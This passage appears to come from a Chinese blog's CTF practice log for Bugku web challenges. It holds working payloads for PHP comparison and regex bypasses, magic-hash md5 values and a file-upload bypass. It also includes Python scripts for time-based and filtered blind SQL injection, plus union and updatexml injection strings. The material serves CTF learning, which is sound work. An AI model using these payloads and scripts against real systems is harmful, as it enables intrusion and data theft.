ord('9'); //ord — 返回字符的 ASCII 码值 $number = '3735929054'; // Check all the input characters! for ($i = 0; $i &lt; strlen($number); $i++) &#123; // Disallow all the digits! $digit = ord($temp&#123;$i&#125;); if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; // Aha, digit not allowed! return \"flase\"; &#125; &#125; if($number == $temp) return $flag; &#125; $temp = $_GET['password']; echo noother_says_correct($temp); ?&gt; 重点在这段代码 if ( ($digit &gt;= $one) &amp;&amp; ($digit &lt;= $nine) ) &#123; // Aha, digit not allowed! return \"flase\"; &#125; &#125; if($number == $temp) return $flag; &#125; 输入的数字中不能包含1-9的数字 如果输入的数字和相等则拿到flag 可以想到的是将这段数字转换为十六进制 hex(3735929054)=0xdeadc0de GET: password=0xdeadc0de 变量覆盖网址打不开 ereg正则%00截断&lt;?php $flag = \"xxx\"; if (isset ($_GET['password'])) &#123; if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) &#123; echo 'You password must be alphanumeric'; &#125; else if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) &#123; if (strpos ($_GET['password'], '-') !== FALSE) //strpos — 查找字符串首次出现的位置 &#123; die('Flag: ' . $flag); &#125; else &#123; echo('- have not been found'); &#125; &#125; else &#123; echo 'Invalid password'; &#125; &#125; ?&gt; 绕过三个if语句即可拿到flag 第一个 if (ereg (\"^[a-zA-Z0-9]+$\", $_GET['password']) === FALSE) 这个比较常见的正则表达式，也很容易理解 [a-zA-Z0-9]+包含大小写字符和数字，^是匹配开始标志，$是匹配结束标志 第二个 if (strlen($_GET['password']) &lt; 8 &amp;&amp; $_GET['password'] &gt; 9999999) password字段长度小于8，但是大于9999999，可以使用科学计数法 第三个 if (strpos ($_GET['password'], '-') !== FALSE) password要包含 -（做题的时候会发现应该是*-*） payload GET: password=1e9%00*-* strpos数组绕过&lt;?php $flag = \"flag\"; if (isset ($_GET['ctf'])) &#123; if (@ereg (\"^[1-9]+$\", $_GET['ctf']) === FALSE) echo '必须输入数字才行'; else if (strpos ($_GET['ctf'], '#biubiubiu') !== FALSE) die('Flag: '.$flag); else echo '骚年，继续努力吧啊~'; &#125; ?&gt; 直接利用ereg和strpos函数不能处理数组的特性绕过 当输入ctf[]=11时，ereg返回值null!==FALSE strpos返回值也为null!=FALSE 拿到flag payload： GET: ?ctf[]=111 //正常做法 ?nctf=1%00%23biubiubiu 数字验证正则绕过&lt;?php error_reporting(0); $flag = 'flag&#123;test&#125;'; if (\"POST\" == $_SERVER['REQUEST_METHOD']) &#123; $password = $_POST['password']; if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) //preg_match — 执行一个正则表达式匹配 长度大于12 &#123; echo 'flag';//这里输出的是假flag 真的在下面 exit; &#125; while (TRUE) &#123; $reg = '/([[:punct:]]+|[[:digit:]]+|[[:upper:]]+|[[:lower:]]+)/'; if (6 &gt; preg_match_all($reg, $password, $arr)) break; $c = 0; $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) &#123; if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1; &#125; if ($c &lt; 3) break; //&gt;=3，必须包含四种类型三种与三种以上 if (\"42\" == $password) echo $flag; else echo 'Wrong password'; exit; &#125; &#125; ?&gt; 代码还挺长，但是直接抓住重点 if (0 &gt;= preg_match('/^[[:graph:]]&#123;12,&#125;$/', $password)) [:graph]是所有可打印的字符,{12,},是在password中匹配12次以上，即password的长度大于12 下面的正则 $ps = array('punct', 'digit', 'upper', 'lower'); //[[:punct:]] 任何标点符号 [[:digit:]] 任何数字 [[:upper:]] 任何大写字母 [[:lower:]] 任何小写字母 foreach ($ps as $pt) &#123; if (preg_match(\"/[[:$pt:]]+/\", $password)) $c += 1; &#125; 要求password中必须包含三种以上的类型的字符，于是正常构造如下的payload POST: password=42adad;d;;a //非正常的 password=42%00 或者POST一个任意不等于password的字符 暂时不知道什么原因导致的 简单waf网址打不开","tags":[{"name":"变量覆盖","slug":"变量覆盖","permalink":"https://sunzhengyu99.github.io/tags/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/"},{"name":"函数漏洞","slug":"函数漏洞","permalink":"https://sunzhengyu99.github.io/tags/%E5%87%BD%E6%95%B0%E6%BC%8F%E6%B4%9E/"},{"name":"绕过","slug":"绕过","permalink":"https://sunzhengyu99.github.io/tags/%E7%BB%95%E8%BF%87/"}]},{"title":"bugku刷题记录2","date":"2020-09-10T01:05:12.000Z","path":"2020/09/10/bugku1/","text":"bugku刷题记录2 速度要快打开页面查看源码什么也没有 抓包看了看，惊喜的发现了flag字段 一段base64 解码后为NDQyMDIy 提交发现并不对。。。看来另有玄机 多go几次后发现了flag值一直在变，并且有一段提示 &lt;!-- OK ,now you have to post the margin what you find --&gt; 用post方法提交你所发现的内容，只好使用脚本（不会写） import requests import base64 url=\"http://120.24.86.145:8002/web6/\" r=requests.session() headers=r.get(url).headers#因为flag在消息头里 mid=base64.b64decode(headers['flag']) mid=mid.decode()#为了下一步用split不报错，b64decode后操作的对象是byte类型的字符串，而split函数要用str类型的 flag = base64.b64decode(mid.split(':')[1])#获得flag:后的值 data=&#123;'margin':flag&#125; print (r.post(url,data).text)#post方法传上去 cookie欺骗注意观察urlhttp://123.206.87.240:8002/web11/index.php?line=2&amp;filename=a2V5cy50eHQ= line=2&amp;filename=a2V5cy50eHQ= a2V5cy50eHQ= 解密是为key.txt line是行的意思，这里应该是查看key.txt的第line行的代码 这里可以查看index.php源码 index.php的base64值为aW5kZXgucGhw 改变line的值可以一行一行的查看源码，可以使用脚本 import requests url1 = \"http://123.206.87.240:8002/web11/index.php?line=\" url2 = \"&amp;filename=aW5kZXgucGhw\" mysession = requests.session() for i in range(0, 40): r = mysession.get(url1+str(i)+url2) print(r.text) &lt;?php error_reporting(0); $file=base64_decode(isset($_GET['filename'])?$_GET['filename']:\"\"); $line=isset($_GET['line'])?intval($_GET['line']):0; if($file=='') header(\"location:index.php?line=&amp;filename=a2V5cy50eHQ=\"); $file_list = array( '0' =&gt;'keys.txt', '1' =&gt;'index.php', ); if(isset($_COOKIE['margin']) &amp;&amp; $_COOKIE['margin']=='margin')&#123; //看这里 $file_list[2]='keys.php'; &#125; if(in_array($file, $file_list))&#123; $fa = file($file); echo $fa[$line]; &#125; ?&gt; if(isset($_COOKIE[&#39;margin&#39;]) &amp;&amp; $_COOKIE[&#39;margin&#39;]==&#39;margin&#39;) 这里可以判断cookie必须满足margin=margin才能访问keys.php never give up查看源码提示了 &lt;!--1p.html--&gt; 直接访问1p.html,发现直接跳转到了bugku的主页，先看源码，发现一段编码应该是base64 JTIyJTNCaWYlMjglMjElMjRfR0VUJTVCJTI3aWQlMjclNUQlMjklMEElN0IlMEElMDloZWFkZXIlMjglMjdMb2NhdGlvbiUzQSUyMGhlbGxvLnBocCUzRmlkJTNEMSUyNyUyOSUzQiUwQSUwOWV4aXQlMjglMjklM0IlMEElN0QlMEElMjRpZCUzRCUyNF9HRVQlNUIlMjdpZCUyNyU1RCUzQiUwQSUyNGElM0QlMjRfR0VUJTVCJTI3YSUyNyU1RCUzQiUwQSUyNGIlM0QlMjRfR0VUJTVCJTI3YiUyNyU1RCUzQiUwQWlmJTI4c3RyaXBvcyUyOCUyNGElMkMlMjcuJTI3JTI5JTI5JTBBJTdCJTBBJTA5ZWNobyUyMCUyN25vJTIwbm8lMjBubyUyMG5vJTIwbm8lMjBubyUyMG5vJTI3JTNCJTBBJTA5cmV0dXJuJTIwJTNCJTBBJTdEJTBBJTI0ZGF0YSUyMCUzRCUyMEBmaWxlX2dldF9jb250ZW50cyUyOCUyNGElMkMlMjdyJTI3JTI5JTNCJTBBaWYlMjglMjRkYXRhJTNEJTNEJTIyYnVna3UlMjBpcyUyMGElMjBuaWNlJTIwcGxhdGVmb3JtJTIxJTIyJTIwYW5kJTIwJTI0aWQlM0QlM0QwJTIwYW5kJTIwc3RybGVuJTI4JTI0YiUyOSUzRTUlMjBhbmQlMjBlcmVnaSUyOCUyMjExMSUyMi5zdWJzdHIlMjglMjRiJTJDMCUyQzElMjklMkMlMjIxMTE0JTIyJTI5JTIwYW5kJTIwc3Vic3RyJTI4JTI0YiUyQzAlMkMxJTI5JTIxJTNENCUyOSUwQSU3QiUwQSUwOXJlcXVpcmUlMjglMjJmNGwyYTNnLnR4dCUyMiUyOSUzQiUwQSU3RCUwQWVsc2UlMEElN0IlMEElMDlwcmludCUyMCUyMm5ldmVyJTIwbmV2ZXIlMjBuZXZlciUyMGdpdmUlMjB1cCUyMCUyMSUyMSUyMSUyMiUzQiUwQSU3RCUwQSUwQSUwQSUzRiUzRQ base64解码后为url编码 %22%3Bif%28%21%24_GET%5B%27id%27%5D%29%0A%7B%0A%09header%28%27Location%3A%20hello.php%3Fid%3D1%27%29%3B%0A%09exit%28%29%3B%0A%7D%0A%24id%3D%24_GET%5B%27id%27%5D%3B%0A%24a%3D%24_GET%5B%27a%27%5D%3B%0A%24b%3D%24_GET%5B%27b%27%5D%3B%0Aif%28stripos%28%24a%2C%27.%27%29%29%0A%7B%0A%09echo%20%27no%20no%20no%20no%20no%20no%20no%27%3B%0A%09return%20%3B%0A%7D%0A%24data%20%3D%20@file_get_contents%28%24a%2C%27r%27%29%3B%0Aif%28%24data%3D%3D%22bugku%20is%20a%20nice%20plateform%21%22%20and%20%24id%3D%3D0%20and%20strlen%28%24b%29%3E5%20and%20eregi%28%22111%22.substr%28%24b%2C0%2C1%29%2C%221114%22%29%20and%20substr%28%24b%2C0%2C1%29%21%3D4%29%0A%7B%0A%09require%28%22f4l2a3g.txt%22%29%3B%0A%7D%0Aelse%0A%7B%0A%09print%20%22never%20never%20never%20give%20up%20%21%21%21%22%3B%0A%7D%0A%0A%0A%3F%3E url解码为源码 &lt;?php f(!$_GET['id']) &#123; header('Location: hello.php?id=1'); exit(); &#125; $id=$_GET['id']; $a=$_GET['a']; $b=$_GET['b']; if(stripos($a,'.')) &#123; echo 'no no no no no no no'; return ; &#125; $data = @file_get_contents($a,'r'); if($data==\"bugku is a nice plateform!\" and $id==0 and strlen($b)&gt;5 and eregi(\"111\".substr($b,0,1),\"1114\") and substr($b,0,1)!=4) &#123; require(\"f4l2a3g.txt\"); //注意这里，flag应该藏在这里 &#125; else &#123; print \"never never never give up !!!\"; &#125; ?&gt; 果然藏在f4l2a3g.txt 过狗一句话此站没有flag，flag被人删了，不用再做了。–一个做题的路人 flag好像真的被删了，列不出来目录，查看wp也没有复现。 正则？字符？ &lt;?php highlight_file('2.php'); $key='KEY&#123;********************************&#125;'; $IM= preg_match(\"/key.*key.&#123;4,7&#125;key:\\/.\\/(.*key)[a-z][[:punct:]]/i\", trim($_GET[\"id\"]), $match); if( $IM )&#123; die('key is: '.$key); &#125; preg_match(&quot;/key.*key.{4,7}key:\\/.\\/(.*key)[a-z][[:punct:]]/i&quot;, trim($_GET[&quot;id&quot;]), $match); 重点在这句话上，考点为正则表达式 定界符：/和/（一般来说是这两个，其实除了\\和字母数字其它的只要是成对出现都可以看做定界符，比如##、！！之类的）； . （一个点）：表示可以匹配任何字符； * ：前面的字符重复零次或多次； {n,m} ：前面的字符重复4~7次； \\ （反斜线）：后面的字符被转义； [a-z] ：在a到z中匹配 ； [[:punct:]] ：匹配任何标点符号； /i ：表示这个正则表达式对大小写不敏感； 因此可以写出符合要求的字符穿 keyakey22222key:/a/aaakeyb! 前女友(SKCTF)题目网址打不开 login1(SKCTF)题目网址打不开 你从哪里来题目提示 are you from google? 你是从google来的吗 考察http头中的referer参数 Referer：浏览器向 WEB 服务器表明自己是从哪个 网页/URL 获得/点击 当前请求中的网址/URL。例如：Referer：http://www.sina.com/ 那么就抓包修改referer这个参数 Referer: https://www.google.com/,直接go即可 md5 collision源码 $md51 = md5('QNKCDZO'); $a = @$_GET['a']; $md52 = @md5($a); if(isset($a))&#123; if ($a != 'QNKCDZO' &amp;&amp; $md51 == $md52) &#123; echo \"nctf&#123;*****************&#125;\"; &#125; else &#123; echo \"false!!!\"; &#125;&#125; else&#123;echo \"please input a\";&#125; 即使用get方式传递一个参数a,使得a的值不等于QNKCDZO但是二者的md5值相同 PHP在处理哈希字符串时，会利用”!=”或”==”来对哈希值进行比较，它把每一个以”0E”开头的哈希值都解释为0，所以如果两个不同的密码经过哈希以后，其哈希值都是以”0E”开头的，那么PHP将会认为他们相同，都是0。 常见的payload有 QNKCDZO 240610708 s878926199a s155964671a s214587387a s214587387a sha1(str) sha1('aaroZmOk') sha1('aaK1STfY') sha1('aaO8zKZF') sha1('aa3OFF9m') 程序员本地网站见到题目就想到了x-forwarded-for，本地地址可以使用IP:127.0.0.1 可以使用google浏览器的插件 各种绕过题目源码 &lt;?php highlight_file('flag.php'); $_GET['id'] = urldecode($_GET['id']); $flag = 'flag&#123;xxxxxxxxxxxxxxxxxx&#125;'; if (isset($_GET['uname']) and isset($_POST['passwd'])) &#123; if ($_GET['uname'] == $_POST['passwd']) print 'passwd can not be uname.'; else if (sha1($_GET['uname']) === sha1($_POST['passwd'])&amp;($_GET['id']=='margin')) die('Flag: '.$flag); else print 'sorry!'; &#125; ?&gt; 首先看一下要传入哪些变量 get:id uname post:passwd id需要进行一次urldecode，解码的值为margin uname与passwd不相同，但是sha1值要相同，并且是严格相等 ===，这里可以使用sha1函数的漏洞，无法处理数组类型的变量，最后会返回0，也可以用sha1强碰撞。 payload urlencode(margin)=%6D%61%72%67%69%6E uname[]=1 passwd[]=2 GET: id=%6D%61%72%67%69%6E&amp;uname[]=1 POST:passwd[]=2 web8&lt;?php extract($_GET); if (!empty($ac)) &#123; $f = trim(file_get_contents($fn)); if ($ac === $f) &#123; echo \"&lt;p&gt;This is flag:\" .\" $flag&lt;/p&gt;\"; &#125; else &#123; echo \"&lt;p&gt;sorry!&lt;/p&gt;\"; &#125; &#125; ?&gt; extract函数作用 (PHP 4, PHP 5, PHP 7) extract — 从数组中将变量导入到当前的符号表 说明 extract ( array &amp;$array [, int $flags = EXTR_OVERWRITE [, string $prefix = NULL ]] ) : int 本函数用来将变量从数组中导入到当前的符号表中。 检查每个键名看是否可以作为一个合法的变量名，同时也检查和符号表中已有的变量名的冲突。 trim (PHP 4, PHP 5, PHP 7) trim — 去除字符串首尾处的空白字符（或者其他字符） 说明 trim ( string $str [, string $character_mask = “ \\t\\n\\r\\0\\x0B” ] ) : string 此函数返回字符串 str 去除首尾空白字符后的结果。如果不指定第二个参数，trim() 将去除这些字符： “ “ (ASCII 32 (0x20))，普通空格符。 “\\t” (ASCII 9 (0x09))，制表符。 “\\n” (ASCII 10 (0x0A))，换行符。 “\\r” (ASCII 13 (0x0D))，回车符。 “\\0” (ASCII 0 (0x00))，空字节符。 “\\x0B” (ASCII 11 (0x0B))，垂直制表符。 file_get_contents (PHP 4 &gt;= 4.3.0, PHP 5, PHP 7) file_get_contents — 将整个文件读入一个字符串 代码的大致含义就是 get方式提交参数，用extract函数将变量写入符号表中，如果get提交的参数中包含$ac，则利用file_get_content函数从文件中读取内容并赋值给$f,如果$ac===$f则拿到flag 这里需要利用php的伪协议写入内容 php://input payload GET: ac=111&amp;fn=php://input POST: 111 细心题目网站崩了 求getshell文件上传 首先先上传一个图片文件，上传成功了并返回保存路径 再上传一个php的文件，提示Invalid file 上传.htaccess, .user.ini都提示you got it 两种提示不一样猜测可能存在后缀黑名单和文件类型检测。 上传一个php5文件并bp抓包修改MIME(Content-Type)为 image/.jpeg还是提示invalid file 再修改请求头部的Content-Type，利用大小写绕过，成功拿到flag 考察知识点： 请求中的Content-Type 在请求中 (如POST 或 PUT)，Content-Type字段用于客户端告诉服务器实际发送的数据类型。当你发送一个HTTP的POST请求时，需要设置请求头中的Content-Type字段，告诉服务端你发送的数据是什么类型的。 设置请求头中的Content-Type 当客户端向服务端发起HTTP的POST请求时，需要告诉服务端，我们发送的数据类型，方便服务端去解析数据。如果你不设置，那么服务端可能无法处理你的请求。 INSERT INTO注入提示了insert into注入 并给出了源码 &lt;?php error_reporting(0); function getIp()&#123; $ip = ''; if(isset($_SERVER['HTTP_X_FORWARDED_FOR']))&#123; //判断是否存在xxf $ip = $_SERVER['HTTP_X_FORWARDED_FOR']; //存在则优先使用xxf &#125;else&#123; $ip = $_SERVER['REMOTE_ADDR']; //remote_addr &#125; $ip_arr = explode(',', $ip); //过滤 , return $ip_arr[0]; &#125; $host=\"localhost\"; $user=\"\"; $pass=\"\"; $db=\"\"; $connect = mysql_connect($host, $user, $pass) or die(\"Unable to connect\");//连接数据库 mysql_select_db($db) or die(\"Unable to select database\"); $ip = getIp(); echo 'your ip is :'.$ip; $sql=\"insert into client_ip (ip) values ('$ip')\"; //注入点 mysql_query($sql); ?&gt; 网页显示出自己的ip地址，想到的是xff头，修改了xff头的内容后，页面回显也会改变，所以就是xff注入。 抓包添加xxf头，并构造注入语句,这里因为过滤了逗号，所以无法使用if语句，又因为没有回显所以要使用基于时间的盲注 $ip_arr = explode(',', $ip); //过滤了, 代替if的注入语句如下 select case when 语句1 then 语句2 else 语句3 end; //含义很好理解，就是当语句1为真时，执行语句2，否则执行语句3 所以要构造的注入语句为 11'+(select case when length(database())=5 then sleep(5) else 0 end))%23 //当数据库名的长度为5时，则执行sleep(5)，否则结束，这样就可以根据网页的响应时间来判断查询语句是否正确 带入原语句 insert into client_ip (ip) values ('$ip') insert into client_ip (ip) values ('11'+(select case when length(database())=5 then sleep(5) else 0 end))%23 //可以看到语句成功注入到原查询语句中，并可以正常执行 判断字段每一个字符的值 常用的语句应该为 1' and (case when (substr(select database()),1,1)='c' then sleep(5) else 1 end) # 但是因为逗号被过滤了，所以改为下面的语句 1' and (case when (substr(select database()) from 1 for 1)='c' then sleep(5) else 1 end) # # -*- coding:utf-8 -*- import requests import sys #sql = '127.0.0.1'+(select case when substr((select group_concat(table_name) from information_schema.tables where table_schema=database()) from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 0 end) --+ ##client_ip,flag #sql = '127.0.0.1'+(select case when substr((select group_concat(column_name) from information_schema.columns where table_name='flag' from &#123;0&#125; for 1)='&#123;1&#125;') then sleep(5) else 0 end) --+ sql = \"127.0.0.1'+(select case when substr((select flag from flag) from &#123;0&#125; for 1)='&#123;1&#125;' then sleep(5) else 0 end))-- +\" url = 'http://123.206.87.240:8002/web15/' flag = '' for i in range(1, 40): print(str(i)) for ch in range(32, 129): if ch == 128: sys.exit(0) sqli = sql.format(i, chr(ch)) header = &#123; 'X-Forwarded-For': sqli &#125; try: html = requests.get(url, headers=header, timeout=3) #响应时间超过3秒则 进入except 即可猜测是正确的 except: flag += chr(ch) print(flag) break 这是一个神奇的登陆框网址打不开 多次tips 本题有2个flagflag均为小写flag格式 flag{} 看到题目提示，应该是二次注入 url中存在id参数，再id参数后加 ‘后页面报错，再加上#后显示 There is nothing 输入 id=1’or 1=1–+ 报错 但是输入id=1’oorr 1=1–+ 时正常了，说明存在关键词过滤，通过异或注入发现过滤了union,select,and,or等关键词，可以用双写绕过。 1'^(length('union')!=0)--+ 页面显示错误正常说明length('union')!=0是错的，即length('union')=0，说明union替换为空了 其他关键词的测试也类似 开始注入 -1' ununionion seselectlect 1,group_concat(table_name) from infoorrmation_schema.tables where table_schema=database()--+ database:flag1,hint -1' ununionion seselectlect 1,group_concat(column_name) from infoorrmation_schema.columns where table_name='flag1'--+ table:flag1,address -1' ununionion seselectlect 1,group_concat(flag1) from flag1 --+ usOwycTju+FTUUzXosjr 解码为：好吧你会SQL注入 -1' ununionion seselectlect 1,group_concat(address) from flag1 --+ 拿到下一关的地址 同样存在一个注入点id，加单引号发现提示了报错信息，很明显是报错注入 报错注入一般是固定的模板 下面使用updatexml()进行注入 函数语法：updatexml(XML_document, XPath_string, new_value); 适用版本: 5.1.5+第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc第二个参数：XPath_string (Xpath格式的字符串) ，如果不了解Xpath语法，可以在网上查找教程。第三个参数：new_value，String格式，替换查找到的符合条件的数据作用：改变文档中符合条件的节点的值 我们通常在第二个xpath参数填写我们要查询的内容。 payload 1' and updatexml(1,concat('~',(select group_concat(table_name) from information_schema.tables where table_schema=database()),'~'),3) %23 database:~class,flag2~ ?id=1' and updatexml(1,concat('~',(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag2'),'~'),3) %23 table:~flag2,address~ # 查数据 ?id=1' and updatexml(1,concat('0x7e',(select flag2 from flag2),'0x7e'),3) %23 拿到真正的flag PHP_encrypt_1(ISCCCTF)题目给了源码分析可知是一个加密过程，并且给了加密后的字符串，所以写出解密脚本即可 加密后的数据为 fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA= &lt;?php function encrypt($data,$key) &#123; $key = md5('ISCC'); $x = 0; $len = strlen($data); $klen = strlen($key); for ($i=0; $i &lt; $len; $i++) &#123; if ($x == $klen) &#123; $x = 0; &#125; $char .= $key[$x]; $x+=1; &#125; for ($i=0; $i &lt; $len; $i++) &#123; $str .= chr((ord($data[$i]) + ord($char[$i])) % 128); &#125; return base64_encode($str); &#125; ?&gt; 解密脚本如下 &lt;?php function decode($str) &#123; $key = md5('ISCC'); // 对密钥进行md5加密 $x=0; $str=base64_decode($str); //对加密后的字符串base64解码 $len=strlen($str); $klen=strlen($key); for($i=0;$i&lt;$len;$i++) //计算出char字符数组，用于最后的减操作 &#123; if($x==$klen) &#123; $x=0; &#125; $char.=$key[$x]; $x+=1; &#125; for($i=0;$i&lt;$len;$i++) &#123; $data.=chr((ord($str[$i])-ord($char[$i])+128)%128); //加上128为了防止出现负数。 &#125; return $data; &#125; echo(decode('fR4aHWwuFCYYVydFRxMqHhhCKBseH1dbFygrRxIWJ1UYFhotFjA=')); ?&gt; 文件包含2网址打不开 flag.php给了提示hint，猜测可能是要提交的参数，get提交hint,显示源码 &lt;?php error_reporting(0); include_once(&quot;flag.php&quot;); $cookie &#x3D; $_COOKIE[&#39;ISecer&#39;]; &#x2F;&#x2F;含cookie 可能需要抓包修改cookie if(isset($_GET[&#39;hint&#39;]))&#123; show_source(__FILE__); &#125; elseif (unserialize($cookie) &#x3D;&#x3D;&#x3D; &quot;$KEY&quot;) &#x2F;&#x2F;如果反序列化后的$cookie&#x3D;&#x3D;&#x3D;$KEY 拿到flag &#123; echo &quot;$flag&quot;; &#125; else &#123; ?&gt; &lt;html&gt; &lt;head&gt; &lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;UTF-8&quot;&gt; &lt;title&gt;Login&lt;&#x2F;title&gt; &lt;link rel&#x3D;&quot;stylesheet&quot; href&#x3D;&quot;admin.css&quot; type&#x3D;&quot;text&#x2F;css&quot;&gt; &lt;&#x2F;head&gt; &lt;body&gt; &lt;br&gt; &lt;div class&#x3D;&quot;container&quot; align&#x3D;&quot;center&quot;&gt; &lt;form method&#x3D;&quot;POST&quot; action&#x3D;&quot;#&quot;&gt; &lt;p&gt;&lt;input name&#x3D;&quot;user&quot; type&#x3D;&quot;text&quot; placeholder&#x3D;&quot;Username&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input name&#x3D;&quot;password&quot; type&#x3D;&quot;password&quot; placeholder&#x3D;&quot;Password&quot;&gt;&lt;&#x2F;p&gt; &lt;p&gt;&lt;input value&#x3D;&quot;Login&quot; type&#x3D;&quot;button&quot;&#x2F;&gt;&lt;&#x2F;p&gt; &lt;&#x2F;form&gt; &lt;&#x2F;div&gt; &lt;&#x2F;body&gt; &lt;&#x2F;html&gt; &lt;?php &#125; $KEY&#x3D;&#39;ISecer:www.isecer.com&#39;; ?&gt; 代码审计完后思路很简单就是cookie注入，而且$KEY的值下面也已经给了 直接构造 ISecer=s:21:\"ISecer:www.isecer.com\"; 但是会发现并没有显示flag，这是因为这题给出的$KEY是迷惑人的，下面这段php代码与上面没关系，就是说明上面代码中$KEY为NULL 所以真正的payload： ISecer=s:0:\"\"; 请求头 GET /flagphp/ HTTP/1.1 Host: 123.206.87.240:8002 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 DNT: 1 Cookie: ISecer=s:0:\"\"; Connection: close sql注入2提示： 全都tm过滤了绝望吗？ 提示 !,!=,=,+,-,^,% 带有过滤的sql注入 先测试一下过滤哪些字符 测试发现 or ，and,#,–+,union,from ,database(),这些常用字符都被过滤了，没有过滤的字符只有提示中的字符 测试还可以发现，当uname=admin&amp;passwd=111时提示的password error , 但是当uname=adm&amp;passwd=111时提示username error，这也是盲注的一种了。 当uname=admin’-1-‘&amp;passwd=11时为false 当uname=admin’-0-‘&amp;passwd=1时为true 所以猜测sql查询语句为 $sql &#x3D; select * from users where username&#x3D;$username; 尝试构造注入语句ascii(substr((select database(),1,1)))&gt;50 上名的语句可以放到admin’-1’&amp;passwd=11中 1的位置 但是还是存在很多问题，因为题目过滤了空格，逗号，多次修改后勾出下面的语句 ascii(mid(REVERSE(MID((passwd)from(-1)))from(-1)))&gt;0 reverse 为字符串反转函数 确定盲注的判断条件 当上面的语句成立时返回的是 username error 不成立时返回的是password error 编写脚本 因为密码保存时一般是以 md5形式保存，所以爆破密码的长度应该为32位 import requests url = \"http://123.206.87.240:8007/web2/login.php\" cookie =&#123;'PHPSESSID':'r3rln64ialiqjnefpa6qu5a0t513t8rs'&#125; password = \"\" for i in range(1,33): for j in '0123456789abcdef': payload = \"admin'-(ascii(mid(REVERSE(MID((passwd)from(-&#123;0&#125;)))from(-1)))=&#123;1&#125;)-'\".format(i,ord(j)) data=&#123;'uname':payload,'passwd':\"111\"&#125; res = requests.post(url=url,cookies=cookie,data=data) if \"username\" in res.text: password +=j #print(password) break print(password) 005b81fd960f61505237dbb7a3202910 md5在线解码后为admin123 登录后即可用ls命令，就可以拿到flag 这题使用的是弱密码，也可以直接使用bp的爆破模块进行密码爆破 参考叶师傅：https://xz.aliyun.com/t/2583 孙xx的博客进入页面是一个博客的页面，有搜索功能，没有思路 于是扫描目录 但是没有有用的信息，查看网上的wp，发现phpmyadmin被人删了，所以没法做 Trim的日记本tips:不要一次就放弃 是个登录页面，但是没有账号，想着先注册一个，但是发现提示数据库连接失败，所以应该不是这个方法 那就万事不觉扫以下 还真有发现 扫到三个目录 login.php register.php show.php 访问show.php,拿到flag login2(SKCTF) login3 文件上传2 login4题目都挂了 江湖魔头提示:学会如来神掌就可以打败他了吧 进入题目发现还真像是游戏的界面 包含属性 练功 商店 赚钱 讨伐 退出 几个页面 其中练功可以提高自身属性，也就是武力值，赚钱每次只能赚100，而商店中有一些提高武力值的武器，其中就有如来神掌，但是价格也高的惊人，肯定不是通过赚钱的方法挣到那么多钱。所以思路就是通过漏洞修改金钱数量之后购买如来神掌，打败魔头拿到flag 查看源码 在wulin.php中可以看到三个js文件 //script.js 在线格式化后的结果 eval(function(p, a, c, k, e, r) &#123; e = function(c) &#123; return (c &lt; 62 ? '' : e(parseInt(c / 62))) + ((c = c % 62) &gt; 35 ? String.fromCharCode(c + 29) : c.toString(36)) &#125;; if ('0'.replace(0, e) == 0) &#123; while (c--) r[e(c)] = k[c]; k = [function(e) &#123; return r[e] || e &#125;]; e = function() &#123; return '[57-9abd-hj-zAB]' &#125;; c = 1 &#125;; while (c--) if (k[c]) p = p.replace(new RegExp('\\\\b' + e(c) + '\\\\b', 'g'), k[c]); return p &#125;('7 s(t)&#123;5 m=t+\"=\";5 8=9.cookie.n(\\';\\');o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p c.substring(m.d,c.d)&#125;p\"\"&#125;7 w(a)&#123;5 x=new Base64();5 q=x.decode(a);5 r=\"\";o(i=0;i&lt;q.d;i++)&#123;5 b=q[i].charCodeAt();b=b^i;b=b-((i%10)+2);r+=String.fromCharCode(b)&#125;p r&#125;7 ertqwe()&#123;5 y=\"user\";5 a=s(y);a=decodeURIComponent(a);5 z=w(a);5 8=z.n(\\';\\');5 e=\"\";o(i=0;i&lt;8.d;i++)&#123;u(-1&lt;8[i].v(\"A\"))&#123;e=8[i+1].n(\":\")[2]&#125;&#125;e=e.B(\\'\"\\',\"\").B(\\'\"\\',\"\");9.write(\\'&lt;img id=\"f-1\" g=\"h/1-1.k\"&gt;\\');j(7()&#123;9.l(\"f-1\").g=\"h/1-2.k\"&#125;,1000);j(7()&#123;9.l(\"f-1\").g=\"h/1-3.k\"&#125;,2000);j(7()&#123;9.l(\"f-1\").g=\"h/1-4.k\"&#125;,3000);j(7()&#123;9.l(\"f-1\").g=\"h/6.png\"&#125;,4000);j(7()&#123;alert(\"浣犱娇鐢ㄥ鏉ョ鎺屾墦璐ヤ簡钂欒€侀瓟锛屼絾涓嶇煡閬撴槸鐪熻韩杩樻槸鍋囪韩锛屾彁浜よ瘯涓€涓嬪惂!A&#123;\"+md5(e)+\"&#125;\")&#125;,5000)&#125;', [], 38, '|||||var||function|ca|document|temp|num||length|key|attack|src|image||setTimeout|jpg|getElementById|name|split|for|return|result|result3|getCookie|cname|if|indexOf|decode_create|base|temp_name|mingwen|flag|replace'.split('|'), 0, &#123;&#125;)) 可以看到function(p, a, c, k, e, r)函数有六个参数，而后面的一串字符可以发现是对应的六个实参，所以可以直接执行这段js代码，看看结果是什么。 ('7 s(t)&#123;5 m=t+\"=\";5 8=9.cookie.n(\\';\\');o(5 i=0;i&lt;8.d;i++)&#123;5 c=8[i].trim();u(c.v(m)==0)p 